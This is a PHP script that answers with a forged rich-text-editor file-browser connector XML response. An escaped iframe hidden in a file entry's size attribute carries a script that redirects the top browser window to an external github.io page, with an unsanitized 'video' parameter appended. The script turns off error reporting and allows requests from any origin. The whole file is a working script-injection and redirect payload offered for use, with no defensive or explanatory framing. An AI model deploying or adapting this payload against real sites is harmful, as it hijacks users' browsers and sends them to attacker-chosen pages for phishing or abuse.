
<?php
// Turn off error reporting to prevent it from showing to users
error_reporting(0);

// Set headers to allow cross-origin requests and return XML content
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/xml; charset=utf-8');
header_remove('Content-Length');  // Remove content-length header for dynamic content length

// Check if the 'video' parameter is set in the URL
if (isset($_GET["video"])) {
    // Get the video ID from the query parameter
    $videoId = $_GET["video"];

    // Generate and output the XML content
    die('<?xml version="1.0" encoding="UTF-8"?>
    <Connector command="GetFoldersAndFiles" resourceType="Document">
        <CurrentFolder path="/1 - f/" url=""/>
        <Files>
            <File desc="1" name="Loading..." size="&lt;iframe height=&quot;0&quot; width=&quot;0&quot; srcdoc=&quot;&amp;lt;script&amp;gt;window.top.location.href=\'https://myhostusa.github.io/testt/profile/' . $videoId . '\';&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;" url="1"/>
        </Files>
    </Connector>');
} else {
    // If the 'video' parameter is not provided, return a simple error message
    die("-_-");
}
?>
